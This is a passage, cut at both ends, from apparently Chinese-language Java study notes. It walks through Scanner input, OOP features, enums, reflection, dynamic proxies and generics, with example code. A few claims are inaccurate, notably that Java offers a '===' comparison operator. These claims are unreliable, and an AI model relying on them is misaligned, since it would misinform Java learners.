Pan3a&quot;.getBytes(&quot;UTF-8&quot;));        &#125;    &#125;&#125;\n\n\nScanner\n推荐hasNextLine方法，直接获取全部数据，hasNext无法获取空格，认为其是结束符。\n\nimport java.util.Scanner;public class ScannerStudy &#123;    public static void main(String[] args) &#123;        Scanner scanner = new Scanner(System.in);        System.out.print(&quot;next方法接收:&quot;);//      判断是否还有输入        if(scanner.hasNext())&#123;            String stringOne = scanner.next();            System.out.println(&quot;输入的数据为:&quot; + stringOne);        &#125;        scanner.close();        Scanner scan = new Scanner(System.in);        System.out.print(&quot;nextLine方式接收:&quot;);        if(scan.hasNextLine())&#123;            String stringTwo = scan.nextLine();            System.out.println(&quot;输入的数据为:&quot; + stringTwo);        &#125;        System.out.print(&quot;请输入数字:&quot;);        int count = 0;        double sum = 0;        while (scan.hasNextDouble())&#123;            double number = scan.nextDouble();            count += 1;            sum += number;        &#125;        System.out.println(&quot;一共&quot; + Integer.toString(count) + &quot;个数&quot;);        System.out.println(&quot;和为&quot; + sum);        scan.close();    &#125;&#125;\n\n\n异常处理- \n面向对象方法\n主要是结合访问控制符和参数传递来实现特定功能。\n\nclass Person&#123;    String[] name = &#123;&#125;;    public Person(String... names)&#123;        for(String name:names)&#123;            System.out.println(&quot;构造方法可变参数: &quot; + name);        &#125;        this.name = names;    &#125;    public void getName()&#123;        for (String name:this.name) &#123;            System.out.print(name + &quot;   &quot;);        &#125;    &#125;    public void setName(String[] names)&#123;        for (String setName:names)&#123;            System.out.println(&quot;数组类型参数: &quot; + setName);        &#125;        this.name = names;    &#125;&#125;public class ObjectFunc &#123;    public static void main(String[] args) &#123;        String[] names = &#123;&quot;Pan3a&quot;,&quot;Forever404&quot;&#125;;//      构造方法实例化        Person personOne = new Person(names);//      数组参数        personOne.setName(names);//      参数传递 指向的是原变量地址   改变变量实质变量名不变地址为新地址---新对象        String name = &quot;Pan3a&quot;;        Person personTwo = new Person(name);        personTwo.getName();        name = &quot;Forever404&quot;;        personTwo.getName();//      参数传递 数组地址没改变 改变的是地址中存的值        String[] color = &#123;&quot;RED&quot;,&quot;BLUE&quot;&#125;;        Person personThree = new Person(color);        personThree.getName();        color[0] = &quot;GREEN&quot;;        System.out.println();        personThree.getName();    &#125;&#125;\n\n\n构造方法\n每个类都有构造方法，没有则Java编译器将会提供一个默认的构造方法。构造方法需与类同名，一个类可以有多个构造方法。\n构造方法类似于Python的__init__(self)主要作用于类的初始化。\n\npackage com.pan3a.test;public class ObjectConstruct &#123;    public static void main(String[] args) &#123;        Person personOne = new Person();        System.out.println(personOne.getName());        System.out.println(personOne.getAge());        Person personTwo = new Person(&quot;Pan3a&quot;,20);        System.out.println(personTwo.getName());        System.out.println(personTwo.getAge());        Person personThree = new Person(&quot;Forever404&quot;);        System.out.println(personThree.getName());        System.out.println(personThree.getAge());    &#125;&#125;class Person&#123;    protected String name;    protected int age;//  无参数构造方法，会自动创建，默认的构造方法    public Person()&#123;    &#125;//  重载此构造方法，实例化类时根据传递参数自动选择构造方法    public Person(String name,int age)&#123;        this.name = name;        this.age = age;    &#125;//  构造方法调用其他构造方法    public Person(String name)&#123;        this(name,18);    &#125;    public String getName()&#123;        return this.name;    &#125;    public int getAge()&#123;        return this.age;    &#125;&#125;\n\n\n方法重载\n方法名相同，参数不同，返回值相同。\noverload，重载，相当于重新写了一个方法，但是这些方法都不同，因为它们的参数都不一样。\n\npackage com.pan3a.hello;public class ObjectOverload &#123;    public static void main(String[] args) &#123;        Person personOne = new Person();        personOne.hello();        personOne.hello(&quot;Pan3a&quot;);        personOne.hello(&quot;Pan3a&quot;,16);        personOne.hello(&quot;Pan3a&quot;,20);    &#125;&#125;class Person&#123;    public void hello()&#123;        System.out.println(&quot;Hello World&quot;);    &#125;    public void hello(String name)&#123;        System.out.println(&quot;Hello &quot; + name);    &#125;    public void hello(String name,int age)&#123;        if (age &gt; 18)&#123;            System.out.println(&quot;Hello &quot; + name + &quot;, you are an adult!&quot;);        &#125;else            System.out.println(&quot;Hello &quot; + name + &quot;, you are a child!&quot;);    &#125;&#125;\n\n\n继承\n子类无法继承父类的构造方法\n子类的构造方法必须与父类的构造方法类型一致   如：无参对应无参\n子类的构造方法第一条语句必须是父类构造方法\n只能单继承，除Object外没有关键字extends的类都是继承于Object\nJava15特性，sealed于permits修饰的类只能在指定的类继承\nJava继承还有向上转型和向下转型两种。\n\nsealed class Color permits Red,Blue,Green&#123;    &#125;\n\n\npackage com.pan3a.extend.up;public class ObjectExtendsUp &#123;    public static void main(String[] args) &#123;        //      向上转型 因为继承关系 Student-&gt;Person-&gt;Object  Student有Person的全部属性        Person personOne = new Student();        System.out.println(personOne.name);        System.out.println(personOne.age);    &#125;&#125;class Person&#123;    public String name = &quot;Pan3a&quot;;    public int age = 18;&#125;class Student extends Person&#123;&#125;\n\n\npackage com.pan3a.extend.up;public class ObjectExtendsUp &#123;    public static void main(String[] args) &#123;        //        向下转型 也是由于继承关系 但父类无法转为子类 因为子类有父类没有的属性        Person p1 = new Student();        Person p2 = new Person();//        Student s2 = (Student) p2;  这里会由于实例化的Person，但变量类型是Student，变量类型中有Person中没有的属性因此会失败        if(p1 instanceof Student)&#123;            Student s1 = (Student) p1;        &#125;    &#125;&#125;class Person&#123;    public String name = &quot;Pan3a&quot;;    public int age = 18;&#125;class Student extends Person&#123;&#125;\n\n\npackage com.pan3a.extend;public class ObjectExtends &#123;    public static void main(String[] args) &#123;//        Student studentPan3a = new Student(&quot;Pan3a&quot;,18,60);        Student studentPan3a = new Student();        System.out.println(studentPan3a.getAge());        System.out.println(studentPan3a.getName());        System.out.println(studentPan3a.getScore());        studentPan3a.setScore(99);        System.out.println(studentPan3a.getScore());    &#125;&#125;class Person&#123;    protected String name;    protected int age;    public Person(String name,int age)&#123;        this.name = name;        this.age = age;    &#125;    public Person() &#123;    &#125;    public void setName(String name)&#123;        this.name = name;    &#125;    public String getName() &#123;        return name;    &#125;    public void setAge(int age)&#123;        this.age = age;    &#125;    public int getAge()&#123;        return age;    &#125;&#125;class Student extends Person&#123;    private int score;    public Student(String name,int age,int score)&#123;//      子类构造方法必须先调用父类构造方法        super(name,age);        this.score = score;    &#125;//  这里子类的构造方法必须与父类对应  如：无参对应无参    public Student()&#123;        super();    &#125;    public void setScore(int score)&#123;        this.score = score;//        System.out.println(&quot;Score has change:&quot; + Integer.toString(score));    &#125;    public int getScore()&#123;        return this.score;    &#125;&#125;final class Animal&#123;&#125;/*这里就无法继承Animal类，因为此类用了final关键字进行修饰class Teacher extends Animal&#123;&#125;*/\n\n\n方法重写\nOverrie，都是同一个方法，类型参数都一样，只不过实现功能有所更改。\n\npackage com.pan3a.override;public class ObjectOverride &#123;    public static void main(String[] args) &#123;        Student studentOne = new Student();        studentOne.hello();    &#125;&#125;class Person&#123;    public void hello()&#123;        System.out.println(&quot;Hello&quot;);    &#125;&#125;class Student extends Person&#123;    @Override    public void hello()&#123;        super.hello();        System.out.println(&quot;Hello World!&quot;);    &#125;&#125;\n\n\n多态\n根据不同类自动执行不同的方法，动态调用。\n\npackage com.pan3a.polymorphism;public class ObjectPolymorphism &#123;    public static void running(Person p)&#123;        p.run();    &#125;    public static void main(String[] args) &#123;        running(new Person());        running(new Student());    &#125;&#125;class Person&#123;    public void run()&#123;        System.out.println(&quot;Person run&quot;);    &#125;&#125;class Student extends Person&#123;    @Override    public void run()&#123;        System.out.println(&quot;Student run&quot;);    &#125;&#125;\n\n\n\n具体例子，多态就会自动选择实例类型。\n\npublic class ObjectPolymorphismDemo&#123;    public static void main(String[] args)&#123;//      一个有普通收入 工资收入 国家补贴的人计算税        Income[] incomes = new Income[]&#123;                new Income(3000),                new Salary(7500),                new StateCouncilSpecialAllowance(15000)        &#125;;        System.out.println(totalTax(incomes));    &#125;    public static double totalTax(Income... incomes)&#123;        double total = 0;        for (Income income:incomes)&#123;            total += income.getTax();        &#125;        return total;    &#125;&#125;class Income&#123;    protected double income;    public Income(double income)&#123;        this.income = income;    &#125;    public double getTax()&#123;        return income * 0.1;    &#125;&#125;// 计算税收class Salary extends Income&#123;    public Salary(double income)&#123;        super(income);    &#125;    @Override    public double getTax() &#123;        if (income &lt;= 5000)&#123;            return 0;        &#125;        return (income - 5000) * 0.2;    &#125;&#125;// 国家补贴免税收class StateCouncilSpecialAllowance extends Salary&#123;    public StateCouncilSpecialAllowance(double income)&#123;        super(income);    &#125;    @Override    public double getTax()&#123;        return 0;    &#125;&#125;\n\n\n抽象类\n抽象类只能被继承，目的是让代码更规范，因为子类必须实现父类定义的方法，即覆写父类方法。\n抽象方法，如果一个类中包含抽象方法，不能包含方法体。那么该类必须是抽象类。任何子类必须重写父类抽象方法，除非子类也是抽象类。\n\npackage com.pan3a.abstractStudy;public class AbstractStudy &#123;    public static void main(String[] args) &#123;        Person personOne = new Student(&quot;pan3a&quot;,18);        personOne.run();        System.out.println(personOne.getName());    &#125;&#125;abstract class Person&#123;    private String name;    private int age;    public Person()&#123;    &#125;    public Person(String name,int age)&#123;         this.name = name;         this.age = age;    &#125;   public abstract void run();    public String getName()&#123;        return name;    &#125;&#125;class Student extends Person&#123;    private String name;    private int age;    public Student()&#123;    &#125;//  此处不能使用Override来检查，因为构造房啊不会被继承    public Student(String name,int age)&#123;        super(name,age);    &#125;    @Override    public void run()&#123;        System.out.println(&quot;Student run&quot;);    &#125;    public void say()&#123;        System.out.println(&quot;Hello &quot; + this.name);    &#125;    @Override    public String getName()&#123;        String name = super.getName();        return name;    &#125;&#125;\n\n\n接口\n接口也可继承，可一个类实现多个接口\n接口可以定义default方法。\n接口默认的方法都是public abstract，这两个只是被省略了。\n\npackage com.pan3a.interfaceStudy;public class ObjectInterface &#123;    public static void main(String[] args) &#123;        Student personOne = new Student(&quot;Pan3a&quot;);        personOne.say();        personOne.red();        personOne.medium();        personOne.printColor();        System.out.println(personOne.getName());    &#125;&#125;interface Person&#123;    void say();    String getName();&#125;interface Color&#123;    void red();//    定义接口方法，可以直接被继承调用    default void printColor()&#123;        System.out.println(&quot;this is interface default method&quot;);    &#125;&#125;// 接口继承接口interface Size extends Color&#123;    void medium();&#125;// 一个类实现多个接口class Student implements Person,Color,Size&#123;    private String name;    public Student(String name)&#123;        this.name = name;    &#125;    @Override    public void say()&#123;        System.out.println(&quot;Hello World!&quot;);    &#125;    @Override    public String getName()&#123;        return this.name;    &#125;    @Override    public void red()&#123;        System.out.println(&quot;this is hello method!&quot;);    &#125;    @Override    public void medium() &#123;        System.out.println(&quot;this is medium!&quot;);    &#125;&#125;\n\n\n内部类\n一：直接创建一个类定义在另一个类的内部\n这里的访问必须实例化外部类再来请求，内部类可访问父类的私有属性。\n\npackage com.pan3a.Inner;public class ObjectInner &#123;    public static void main(String[] args) &#123;        Person personOne = new Person(&quot;Pan3a&quot;);        Person.Student student = personOne.new Student();        student.info();    &#125;&#125;class Person&#123;    private String name;    public Person(String name)&#123;        this.name = name;    &#125;    class Student&#123;        void info()&#123;            System.out.println(&quot;Hello &quot; + Person.this.name + &quot; I am a Student!&quot;);        &#125;    &#125;&#125;\n\n\n\n二：匿名类，不需要在内部定义一个类，直接实例化。\n\npublic class ObjectInnerAnonymous &#123;    public static void main(String[] args) &#123;        AnonymousDemo anonymousDemo = new AnonymousDemo(&quot;Pan3a&quot;);    &#125;&#125;class Inner&#123;    public void display()&#123;        System.out.println(&quot;在 Inner 类内部。&quot;);    &#125;&#125;class AnonymousDemo&#123;    private String name;    public AnonymousDemo(String name)&#123;        this.name = name;        inner.display();    &#125;    // 匿名类继承一个类    Inner inner = new Inner()&#123;        @Override        public void display()&#123;            System.out.println(&quot;在匿名类内部。&quot;);        &#125;    &#125;;&#125;\n\n\n\n静态内部类\n\n枚举\n枚举限制变量只能使用预先设定好的值，相当于常量。如四季的春夏秋冬。\n通过name()获取常量定义的字符串，注意不要使用toString()，因为它可以被覆盖。\nordinal()获取常量定义的顺序，类似于数组的顺序，但是并没有实质意义，因为更改枚举元素之后顺序会发生变化。\nenum的构造方法要声明为private，字段强烈建议声明为final，常用于switch语句中。\nenum中也可以编写构造方法，字段，方法。\n常量普通设定方法\n\nclass Year&#123;    public static final String spring = &quot;spring&quot;;    public static final String summer = &quot;summer&quot;;    public static final String autumn = &quot;autumn&quot;;    public static final String winter = &quot;winter&quot;;&#125;\n\n\n\n注意Java版本在JDK8版本之前使用equals进行输入对比判断。也可也使用===进行判断。如果使用==比较，它比较的是两个引用类型的变量是否是同一个对象。因此，引用类型比较，要始终使用equals()方法，但enum类型可以例外。\n\nclass Year&#123;    public static final String spring = &quot;spring&quot;;    public static final String summer = &quot;summer&quot;;    public static final String autumn = &quot;autumn&quot;;    public static final String winter = &quot;winter&quot;;&#125;public class EnumStudy &#123;    public static void main(String[] args) &#123;       String day;       Scanner scan = new Scanner(System.in);       day = scan.nextLine();       scan.close();       if(day.equals(Year.spring) || day.equals(Year.autumn))&#123;           System.out.println(&quot;OK&quot;);       &#125;    &#125;&#125;\n\n\n\n迭代枚举元素\n\nenum Years&#123;    SPRING,SUMMER,AUTUMN,WINTER;&#125;public class EnumStudy &#123;    public static void main(String[] args) &#123;        for (Years y: Years.values())&#123;            System.out.println(y);        &#125;    &#125;&#125;\n\n\n\n结合switch\n\n反射\nJava的反射，Java的反射是指程序在运行期可以拿到一个对象的所有信息。\n创建一个类，后面用来进行测试使用，注意请将一下测试文件都放在一个包内。\n\npackage com.pan3a.reflection;public class ReflectionMain &#123;&#125;class Person&#123;    private int age;    private String name;    public long id=9527;    public long grade;    protected float score;    protected int rank;    public Person()&#123;    &#125;    protected Person(long id)&#123;        this(18,&quot;Pan3a&quot;,id,9,9999,31);    &#125;    private Person(int age)&#123;        this(age,&quot;Pan3a&quot;,9527,9,9999,30);    &#125;    public Person(int age,String name,long id,long grade,float score,int rank)&#123;        this.age = age;        this.name = name;        this.id = id;        this.grade = grade;        this.score = score;        this.rank = rank;    &#125;    public int getAge()&#123;        return age;    &#125;    public void setAge(int age)&#123;        this.age = age;    &#125;    public String getName()&#123;        return name;    &#125;    public void setName(String name)&#123;        this.name = name;    &#125;    public long getId()&#123;        return id;    &#125;    public void setId(long id)&#123;        this.id = id;    &#125;    public long getGrade()&#123;        return grade;    &#125;    public void setGrade(long grade)&#123;        this.grade = grade;    &#125;    public float getScore()&#123;        return score;    &#125;    public void setScore(float score)&#123;        this.score = score;    &#125;    public int getRank()&#123;        return rank;    &#125;    public void setRank(int rank)&#123;        this.rank = rank;    &#125;    private static void sayHello()&#123;        System.out.println(&quot;Hello World&quot;);    &#125;    private void sayHello(String name)&#123;        System.out.println(&quot;Hello &quot; + name);    &#125;    @Override    public String toString()&#123;        final StringBuffer stringBuffer = new StringBuffer(&quot;Person&#123;&quot;);        stringBuffer.append(&quot;age=&quot;).append(age);        stringBuffer.append(&quot;, name=&#x27;&quot;).append(name).append(&#x27;\\&#x27;&#x27;);        stringBuffer.append(&quot;, id=&quot;).append(id);        stringBuffer.append(&quot;, grade=&quot;).append(grade);        stringBuffer.append(&quot;, score=&quot;).append(score);        stringBuffer.append(&quot;, rank=&quot;).append(rank);        stringBuffer.append(&#x27;&#125;&#x27;);        return stringBuffer.toString();    &#125;&#125;class Teacher extends Person&#123;    private String role = &quot;Teacher&quot;;    public void sayHello()&#123;        System.out.println(&quot;Hello Teacher&quot;);    &#125;&#125;class Student extends Teacher&#123;    private String role = &quot;Student&quot;;    @Override    public void sayHello()&#123;        System.out.println(&quot;Hello Student&quot;);    &#125;&#125;\n\n\n获取对象\n对象的获取有三种方式分别是Class.forName(全类名),对象.getclass()，类名.class。 \n这里的三种方式虽然作用都一样，但是都有各自的缺点。 \nclass.forName需要知道类名的全路径。对象名.class需要存在已经实例化的对象。类名.class需要提前在编译前知道类名。 \n下面会发现这里的比较都是true，因此说这里返回的对象都是同一个，因此Person.class只加载了一次。 \n用instanceof不但匹配指定类型，还匹配指定类型的子类。而用==判断class实例可以精确地判断数据类型，但不能作子类型比较。\n\npackage com.pan3a.reflection;public class ReflectionGetClass &#123;    public static void main(String[] args) throws Exception&#123;        com.pan3a.reflection.Student student = new com.pan3a.reflection.Student();        com.pan3a.reflection.Teacher teacher = new com.pan3a.reflection.Teacher();        com.pan3a.reflection.Person person = new com.pan3a.reflection.Person();        if(student instanceof com.pan3a.reflection.Person)&#123;            System.out.println(&quot;Student 是 Person 子类&quot;);        &#125;//      Class.forName        Class class1 = Class.forName(&quot;com.pan3a.reflection.Person&quot;);        System.out.println(&quot;别名:&quot; + class1.getSimpleName());        System.out.println(class1);//      类名.class        Class class2 = com.pan3a.reflection.Person.class;        System.out.println(class2);//      对象.getClass()        com.pan3a.reflection.Person person1 = new com.pan3a.reflection.Person();        Class class3 = person1.getClass();        System.out.println(class3);        System.out.println(class1 == class2);        System.out.println(class1 == class3);    &#125;&#125;\n\n\n成员变量\n获取成员变量需要知道一下四个方法，getField，getFields，getDeclaredField，getDeclaredFields。\n还可获取成员变量属性的三个方法，getType，getModifiers，getName。分别是获取变量类型，修饰符，成员名。\n他们分别是获取单个成员，和获取所有成员，获取单个成员（忽略修饰服限制，不包括父类），获取多个成员（忽略修饰服限制，不包括父类）。需注意的是使用后面两个是需使用setAccessible(true)来忽略编译时的安全检查。\n这里牵扯到了反射实现构造方法，后面也再会讲到。\n\npackage com.pan3a.reflection;import java.lang.reflect.Field;import java.lang.reflect.Modifier;public class ReflectionGetField &#123;    public static void main(String[] args) throws Exception&#123;        Class class1 = Class.forName(&quot;com.pan3a.reflection.Person&quot;);        getFieldStudy(class1);        getFieldsStudy(class1);        getDeclaredFieldStudy(class1);        getDeclaredFieldsStudy(class1);        setFieldStudy(class1);    &#125;    public static void getFieldStudy(Class class1) throws Exception&#123;        System.out.println(&quot;getField&quot;);        Field fieldId = class1.getField(&quot;id&quot;);        System.out.println(fieldId);        Field fieldGrade = class1.getField(&quot;grade&quot;);        System.out.println(fieldGrade);        System.out.println();//      该对象还有其他成员但是用此方法无法获取，因为他们不是用public修饰的    &#125;    public static void getFieldsStudy(Class class1)&#123;        System.out.println(&quot;getFields&quot;);        Field[] fields = class1.getFields();        for (Field field : fields)&#123;            System.out.println(field);        &#125;        System.out.println();    &#125;    public static void getDeclaredFieldStudy(Class class1) throws Exception&#123;        System.out.println(&quot;getDeclaredField&quot;);        Field fieldAge = class1.getDeclaredField(&quot;age&quot;);        System.out.println(fieldAge);        Field fieldName = class1.getDeclaredField(&quot;score&quot;);        System.out.println(fieldName);        System.out.println();    &#125;    public static void getDeclaredFieldsStudy(Class class1) throws Exception&#123;        System.out.println(&quot;getDeclaredFields&quot;);        Field[] fields = class1.getDeclaredFields();        for(Field field:fields)&#123;            System.out.println(&quot;成员名:&quot; + field.getName() + &quot;\\t成员修饰符:&quot; + field.getModifiers() + &quot;\\t成员类型:&quot; + field.getType());        &#125;        System.out.println();    &#125;//  反射修改私有成员值    public static void setFieldStudy(Class class1) throws Exception&#123;        System.out.println(&quot;反射获取,修改成员值&quot;);        com.pan3a.reflection.Person person = new com.pan3a.reflection.Person();        System.out.println(&quot;ID:&quot; + person.getId());//      反射获取成员变量值并且修改成员变量        Field fieldAge = class1.getDeclaredField(&quot;id&quot;);        fieldAge.setAccessible(true);//      实例化对象为后面获取,修改成员做准备,这里后面还会讲到的构造方法        Object object = class1.newInstance();        System.out.println(&quot;ID:&quot; + fieldAge.get(object));        fieldAge.set(object,9999);        System.out.println(&quot;ID:&quot; + fieldAge.get(object));    &#125;&#125;\n\n\n构造方法\n平常正向操作都是new一个对象。通过反射调用构造方法有两种方式，分别是Person.class.newInstance()，(Person)constructor.newInstance()。两者区别就是前者无法调用含参的构造方法，后者可以。\n实例化对象时，对于非public的任然需要constructor.setAccessible(true)。\n\npackage com.pan3a.reflection;import java.lang.reflect.Constructor;public class ReflectionConstructor &#123;    public static void main(String[] args) throws Exception&#123;        Class personClass = Class.forName(&quot;com.pan3a.reflection.Person&quot;);        System.out.println(&quot;所有构造方法&quot;);        Constructor[] constructors = personClass.getDeclaredConstructors();        for (Constructor constructor:constructors)&#123;            System.out.println(constructor);        &#125;        System.out.println();        System.out.println(&quot;public无参数构造方法&quot;);//      默认当前类的无参数构造方法        Constructor constructor1 = personClass.getConstructor();        System.out.println(constructor1);        System.out.println(&quot;protected带参数构造方法&quot;);        Constructor constructor2 = personClass.getDeclaredConstructor(long.class);        System.out.println(constructor2);        System.out.println(&quot;private带参数构造方法&quot;);        Constructor constructor3 = personClass.getDeclaredConstructor(int.class);        System.out.println(constructor3 + &quot;\\n&quot;);        System.out.println(&quot;public无参数构造方法创建对象&quot;);        Object person1 = constructor1.newInstance();        System.out.println(person1);        System.out.println(&quot;protected带参数构造方法创建对象&quot;);        constructor2.setAccessible(true);        Object person2 = constructor2.newInstance(9528);        System.out.println(person2);        System.out.println(&quot;private带参数构造方法创建对象&quot;);        constructor3.setAccessible(true);        Object person3 = constructor3.newInstance(18);        System.out.println(person3);        System.out.println(&quot;Person.class.newInstance()&quot;);        Class class1 = com.pan3a.reflection.Person.class;        Object object = class1.newInstance();        System.out.println(object);    &#125;&#125;\n\n\n成员方法\n获取成员方法如通获取成员变量类似，也有四个方法。getMethod，getMethods，getDeclaredMethod，getDeclaredMethods。\n获取方法属性，getName，getReturnType，getParameterTypes，getModifiers。\n\npackage com.pan3a.reflection;import java.lang.reflect.Method;public class ReflectionMethod &#123;    public static void main(String[] args) throws Exception&#123;        Class personClass = Class.forName(&quot;com.pan3a.reflection.Person&quot;);        getMethodStudy(personClass);//        getMethodsStudy(personClass);        getDeclaredMethodStudy(personClass);//        getDeclaredMethodsStudy(personClass);    &#125;    public static void getMethodStudy(Class personClass) throws Exception&#123;        System.out.println(&quot;getMethod获取单个非public方法&quot;);        Object object = personClass.newInstance();        Method method = personClass.getMethod(&quot;getId&quot;);        System.out.println(method);        long Id = (long) method.invoke(object);        System.out.println(&quot;Id:&quot; + Id);//      多态，依旧根据传入的实例化对象为准，如果没有则向父类寻找        Class teacherClass = Class.forName(&quot;com.pan3a.reflection.Teacher&quot;);        Method method1 = teacherClass.getMethod(&quot;sayHello&quot;);        method1.invoke(new com.pan3a.reflection.Student());    &#125;    public static void getMethodsStudy(Class personClass) throws Exception&#123;        System.out.println(&quot;getMethods获取所有非public方法&quot;);        Method[] methods = personClass.getMethods();        for (Method method:methods)&#123;            System.out.println(method);        &#125;    &#125;    public static void getDeclaredMethodStudy(Class personClass) throws Exception&#123;        System.out.println(&quot;getDeclaredMethod单个方法不限制修饰符&quot;);        Object object = personClass.newInstance();        Method method = personClass.getDeclaredMethod(&quot;sayHello&quot;,String.class);        System.out.println(method);        method.setAccessible(true);        method.invoke(object,&quot;Pan3a&quot;);//      由于这里和方法为静态方法，因此object为null        Method method1 = personClass.getDeclaredMethod(&quot;sayHello&quot;);        method1.setAccessible(true);        method1.invoke(null);    &#125;    public static void getDeclaredMethodsStudy(Class personClass) throws Exception&#123;        System.out.println(&quot;获取所有方法&quot;);        Method[] methods = personClass.getDeclaredMethods();        for(Method method:methods)&#123;            System.out.println(&quot;方法名:&quot; + method.getName() + &quot;\\t方法返回值类型:&quot; + method.getReturnType() + &quot;\\t方法参数类型:&quot; + method.getParameterTypes() + &quot;\\t方法修饰符:&quot; + method.getModifiers());        &#125;    &#125;&#125;\n\n\n继承关系\ngetSuperclass()，获取父类类型，getInterfaces()获取当前类实现的所有接口。\n\npackage com.pan3a.reflection;public class ReflectionSuper &#123;    public static void main(String[] args) throws Exception&#123;        superClass();        interfaceReflection();    &#125;    public static void superClass() throws Exception&#123;        Class studentClass = Class.forName(&quot;com.pan3a.reflection.Student&quot;);        Class teacherClass = studentClass.getSuperclass();        Class personClass = teacherClass.getSuperclass();        Class objectClass = personClass.getSuperclass();        Class objectSuperClass = objectClass.getSuperclass();        System.out.println(studentClass);        System.out.println(teacherClass);        System.out.println(personClass);        System.out.println(objectClass);//      综合可看出除了Object类外，如果类没有继承，那么默认继承Object。        System.out.println(objectSuperClass);    &#125;    public static void interfaceReflection() throws Exception&#123;        Class integer = Integer.class;        Class[] integerInterfaces = integer.getInterfaces();        for (Class integerInterface:integerInterfaces)&#123;            System.out.println(integerInterface);        &#125;    &#125;&#125;\n\n\n动态代理\n平常实现接口方式。\n\npackage com.pan3a.reflection;public class ReflectionDynamicProxy &#123;    public static void main(String[] args) &#123;        HelloWorld helloWorld = new HelloWorld();        helloWorld.morning(&quot;Pan3a&quot;);    &#125;&#125;interface Hello&#123;    void morning(String name);&#125;class HelloWorld implements Hello&#123;    public void morning(String name)&#123;        System.out.println(&quot;Good morning &quot; + name);    &#125;&#125;\n\n\n\n动态代理实现方法\n\npackage com.pan3a.reflection;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;public class ReflectionDynamicProxy &#123;    public static void main(String[] args) &#123;        InvocationHandler invocationHandler = new InvocationHandler() &#123;            @Override            public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;                System.out.println(method);                if(method.getName().equals(&quot;morning&quot;))&#123;                    System.out.println(&quot;Good morning,&quot; + args[0]);                &#125;                return null;            &#125;        &#125;;        Hello hello = (Hello) Proxy.newProxyInstance(                Hello.class.getClassLoader(),                new Class[] &#123;Hello.class&#125;,                invocationHandler);        hello.morning(&quot;Pan3a&quot;);    &#125;&#125;interface Hello&#123;    void morning(String name);&#125;\n\n\n泛型\n泛型就是定义一种模板\n\n使用泛型\n泛型类型实际上就是Object\n使用泛型时就是把&lt;T&gt;替换成需要的class类型\n\n\npackage com.pan3a.generics;import java.util.Arrays;public class GenericsInterface &#123;    public static void main(String[] args) &#123;        Person[] person = new Person[]&#123;                new Person(&quot;Pan3a&quot;,18),                new Person(&quot;Forever404&quot;,20),        &#125;;        Arrays.sort(person);        System.out.printf(Arrays.toString(person));    &#125;&#125;class Person implements Comparable&lt;Person&gt;&#123;    String name;    int score;    Person(String name, int score)&#123;        this.name = name;        this.score = score;    &#125;    public int compareTo(Person other)&#123;        return this.name.compareTo(other.name);    &#125;    public String toString()&#123;        return this.name + &quot;,&quot; + this.score;    &#125;&#125;\n\n\n编写泛型public class GenericsEditor &#123;    public static void main(String[] args) &#123;    &#125;&#125;// 多泛型 class Pair&lt;T, K&gt;class Pair&lt;T&gt;&#123;    private T first;    private T last;    public Pair(T first, T last)&#123;        this.first = first;        this.last = last;    &#125;    public T getFirst()&#123;        return first;    &#125;    public T getLast()&#123;        return last;    &#125;//    静态方法使用泛型    public static &lt;K&gt; Pair&lt;K&gt; create(K first, K last)&#123;        return new Pair&lt;K&gt;(first,last);    &#125;&#125;\n\n\n擦拭法\n泛型实现方式是擦拭法（Type Erasure）。\nJava的泛型是由编译器在编译时实行的，编译器内部永远把所有类型T视为Object处理，但是，在需要转型的时候，编译器会根据T的类型自动为我们实行安全地强制转型。\n局限一，&lt;T&gt;不能是基本类型，例如int，因为实际类型是Object，Object类型无法持有基本类型。必须是如&lt;Intager&gt;。\n局限二，无法取得泛型的Class。\n局限三，无法判断带泛型的类型\n局限四不能实例化&lt;T&gt;类型，因为编译器会把&lt;T&gt;看成&lt;Object&gt;。\n\npackage com.pan3a.generics;import java.lang.reflect.Type;import java.lang.reflect.ParameterizedType;public class GenericsErasure &#123;    public static void main(String[] args) &#123;        Pair&lt;String&gt; pairOne = new Pair&lt;&gt;(&quot;Hello&quot;,&quot;World&quot;);        Pair&lt;Integer&gt; pairTwo = new Pair&lt;&gt;(123,456);        Class classOne = pairOne.getClass();        Class classTwo = pairTwo.getClass();        System.out.println(classOne == classTwo);        System.out.println(classOne == Pair.class);/*      泛型类无法判断其类型比如String，Integer        if (pairOne instanceof pairTwo)&#123;            System.out.println(&quot;&quot;);        &#125; *///        泛型类继承        Class&lt;IntPair&gt; clazz = IntPair.class;        Type type = clazz.getGenericSuperclass();        if (type instanceof ParameterizedType)&#123;            ParameterizedType parameterizedType = (ParameterizedType) type;            Type[] types = parameterizedType.getActualTypeArguments();//            可能有多个泛型类型            Type firstType = types[0];       //获取第一个泛型类            Class&lt;?&gt; typeClass = (Class&lt;?&gt;) firstType;            System.out.println(typeClass);        &#125;    &#125;&#125;class Pair&lt;T&gt;&#123;    private T first;    private T last;    public Pair(T first,T last)&#123;        this.first = first;        this.last = last;    &#125;    public T getFirst()&#123;        return first;    &#125;    public T getLast()&#123;        return last;    &#125;&#125;class IntPair extends Pair&lt;Integer&gt; &#123;    public IntPair(Integer first, Integer last) &#123;        super(first, last);    &#125;&#125;\n\n\nextends通配符\n&lt;? extends Number&gt;通配符方法。\n引用通配符方法时，Number number = Object.getFirst();这里的Number不能为integer，这样可能因为读取出来的是Double类型导致类型不匹配而报错。\n使用extends时表示可读不可写。\n\npackage com.pan3a.generics.extend;public class GenericsExtends &#123;    public static void main(String[] args) &#123;        Pair&lt;Integer&gt; pair = new Pair&lt;Integer&gt;(123,456);        int n = add(pair);        System.out.println(n);    &#125;  //  static int add(Pair&lt;Number&gt; p)  这样也会报错无法识别因为Pair&lt;Integer&gt;不是Pair&lt;Number&gt;的子类    static int add(Pair&lt;? extends Number&gt; pair)&#123;        Number first = pair.getFirst();        Number last = pair.getLast();//        这里会直接编译错误，因为我们如果传入的是Double setFirst是Integer型 因此会出现类型不匹配//        pair.setFirst(new Integer(first.intValue() + 100));        return first.intValue() + last.intValue();    &#125;&#125;class Pair&lt;T&gt;&#123;    private T first;    private T last;    public Pair(T first, T last)&#123;        this.first = first;        this.last = last;    &#125;    public T getFirst()&#123;        return first;    &#125;    public T getLast()&#123;        return last;    &#125;    public void setFirst(T first)&#123;        this.first = first;    &#125;    public void setLast(T last)&#123;        this.last = last;    &#125;&#125;\n\n\nsuper通配符\n&lt;? super Integer&gt;通配符方法。\n可以调用传入Integer引用的方法，例如：obj.setFirst(Integer 